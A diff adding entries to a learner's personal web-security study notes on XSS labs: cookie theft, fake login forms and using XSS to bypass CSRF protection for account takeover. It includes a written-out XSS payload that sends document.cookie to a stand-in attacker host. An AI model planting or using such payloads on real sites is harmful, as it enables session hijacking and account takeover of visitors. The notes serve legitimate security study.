@@ -1135,6 +1135,35 @@ backtick string backtick — uses backticks not quotes
 ${expression} — evaluates any JS expression inline
 similar to Python f-strings: f"{variable}"
 
+XSS cookie stealing concept:
+<script>fetch('https://attacker.com?c='+document.cookie)</script>
+stored in comment → fires for every visitor → cookies sent to attacker
+cookies contain session tokens → attacker logs in as victim
+
+XSS credential stealing concept:
+inject fake login form via XSS
+victim types credentials into attacker-controlled form
+credentials sent to attacker server via fetch()
+requires: external server to receive data (Burp Collaborator, webhook.site, VPS)
+
+Labs 22-23: watched only — require Burp Collaborator (Pro feature)
+concept understood — will practice in real bug bounty with own server
+
+Lab 24 XSS — Exploiting XSS to bypass CSRF defenses — DONE (tutorial)
+concept: XSS on same origin can read CSRF tokens from the DOM
+         CSRF protection becomes useless when XSS exists on the same site
+attack chain:
+  stored XSS fires in victim browser
+  → JavaScript reads CSRF token from page DOM
+  → fetch() sends forged request with stolen token
+  → server accepts it because token is valid
+  → victim's email changed
+
+key lesson: XSS + CSRF = complete account takeover
+            fixing XSS automatically fixes CSRF bypass
+            CSRF protection only works when attacker cannot read page content
+            
+
 ======================================================
 THINGS I STILL NEED TO PRACTICE
 ======================================================
